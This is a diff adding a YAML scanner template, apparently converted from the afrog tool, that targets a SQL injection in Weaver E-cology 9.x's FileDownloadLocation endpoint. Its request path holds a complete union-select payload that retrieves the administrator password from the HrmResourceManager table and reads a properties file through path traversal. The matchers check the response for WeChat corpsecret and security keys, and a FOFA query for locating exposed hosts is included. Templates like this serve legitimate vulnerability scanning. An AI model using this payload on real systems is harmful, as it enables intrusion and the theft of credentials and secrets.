@@ -1,0 +1,32 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - wx.enabled
+          - wx.corpid
+          - wx.corpsecret
+          - security.key
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/weaver/weaver.email.FileDownloadLocation/login/LoginSSOxjsp/x.FileDownloadLocation?ddcode=7ea7ef3c41d67297&downfiletype=eml&download=1&mailId=1123+union+select+*+from+(select+1+as+resourceid,''../ecology/WEB-INF/prop/mobilemode.properties''+as+x2,''3''+as+x3,(select++*+from+(select+*+from+(select+password+from+HrmResourceManager+where+id=1)x)x)+as+x4,5+as+x5,6+as+x6)x+where+1=1&mailid=action.WorkflowFnaEffectNew&parentid=0'
+id: weaver-ecology9-filedownloadlocation-sqli
+info:
+  author: ZacharyZcR
+  description: |
+    Weaver E-cology 9.x FileDownloadLocation interface has a SQL injection vulnerability.
+    The vulnerability exists in the mailId parameter which allows an attacker to execute arbitrary SQL queries.
+    FOFA: body="doCheckPopupBlocked"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: Weaver E-cology 9.x FileDownloadLocation SQL Injection
+  severity: critical
+  tags: weaver,ecology,sqli,argus-import
